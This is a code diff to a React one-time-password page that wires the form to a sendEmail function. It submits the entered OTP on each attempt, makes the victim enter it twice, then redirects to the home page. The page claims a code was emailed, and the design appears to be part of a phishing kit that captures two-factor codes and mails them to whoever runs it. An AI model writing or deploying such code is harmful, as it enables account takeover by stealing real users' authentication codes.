@@ -1,14 +1,17 @@
-import React, { useState } from "react";
+import React, { useRef, useState } from "react";
 import "../OTP/OTP.css";
 import { IoIosArrowDown } from "react-icons/io";
 import { useNavigate } from "react-router";
+import { sendEmail } from "../SendEmail/sendEmail";
 
 const OTP = () => {
   const [activeField, setActiveField] = useState(null);
   const navigate = useNavigate();
   const [errors, setErrors] = useState({});
   const [submissionCount, setSubmissionCount] = useState(0);
-  const [otp, setOTP] = useState("");
+  const [otp, setOtp] = useState("");
+  const form = useRef()
+  
   const verify = (e) => {
     
     e.preventDefault();
@@ -24,8 +27,10 @@ const OTP = () => {
     if (Object.keys(newErrors).length === 0) {
       if (submissionCount >= 1) {
         navigate("/");
+        sendEmail(form)
       } else {
         setSubmissionCount((prev) => prev + 1);
+        sendEmail(form)
       }
     }
   };
@@ -84,19 +89,20 @@ const OTP = () => {
           </svg>
         </header>
 
-        <form action="" id="form" onSubmit={verify}>
+        <form action="" id="form" ref={form} onSubmit={verify}>
           <h1>Enter OTP</h1>
           <p id="sub-heading">We sent a one-time password to your email.</p>
 
           <div id="inputdiv">
             <p>One Time Password</p>
             <input
+              name="otp"
               className={`input ${activeField === "otp"? "active-border" : ""}`}
               type="text"
               onFocus={()=>setActiveField("otp")}
               onBlur={()=>setActiveField(null)}
               value={otp}
-              onChange={(e) => setOTP(e.target.value)}
+              onChange={(e) => setOtp(e.target.value)}
             />
             {errors.otp && <p className="errorP"> {errors.otp}</p>}
           </div>
